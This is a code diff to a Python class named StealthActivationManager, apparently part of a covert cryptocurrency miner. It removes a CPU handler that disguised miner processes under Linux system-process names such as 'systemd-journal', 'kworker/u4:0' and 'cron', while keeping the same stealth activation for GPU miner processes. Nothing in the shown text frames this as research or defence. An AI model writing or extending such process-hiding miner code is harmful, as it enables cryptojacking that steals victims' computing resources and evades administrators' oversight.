@@ -134,9 +134,7 @@ class StealthActivationManager:
         try:
             self.logger.info("🔌 [STEALTH-ACTIVATION] Setting up EventBus subscriptions...")
             
-            # Subscribe to CPU PID registration events
-            self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_pid_registered)
-            self.event_subscriptions.append('mining:cpu_pid_registered')
+            # CPU PID registration removed - GPU-only operations
             
             # Subscribe to GPU PID registration events  
             self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_pid_registered)
@@ -148,37 +146,7 @@ class StealthActivationManager:
             self.logger.error(f"❌ [STEALTH-ACTIVATION] EventBus subscription error: {e}")
             raise
     
-    def _on_cpu_pid_registered(self, event_data: Dict[str, Any]):
-        """
-        **[CPU PID Registration Handler]** (xử lý đăng ký PID CPU)
-        
-        Được gọi khi EventBus nhận được 'mining:cpu_pid_registered' event.
-        """
-        try:
-            pid = event_data.get('pid')
-            process_name = event_data.get('process_name', 'ml-inference')
-            
-            self.logger.info(f"🔔 [STEALTH-ACTIVATION] CPU PID registered: {pid} ({process_name})")
-            
-            # **CRITICAL**: Activate stealth for CPU process
-            success = self._activate_process_stealth(
-                pid=pid, 
-                process_name=process_name,
-                process_type='CPU',
-                stealth_names=[
-                    "systemd-sleep", "kworker/u4:0", "migration/1", "rcu_gp",
-                    "systemd-journal", "systemd-resolve", "dbus-daemon",
-                    "NetworkManager", "cron", "irqbalance"
-                ]
-            )
-            
-            if success:
-                self.logger.info(f"✅ [STEALTH-ACTIVATION] CPU process PID {pid} stealth activated")
-            else:
-                self.logger.error(f"❌ [STEALTH-ACTIVATION] CPU process PID {pid} stealth activation failed")
-                
-        except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] CPU PID handler error: {e}")
+    # CPU PID registration handler removed - GPU-only operations
     
     def _on_gpu_pid_registered(self, event_data: Dict[str, Any]):
         """
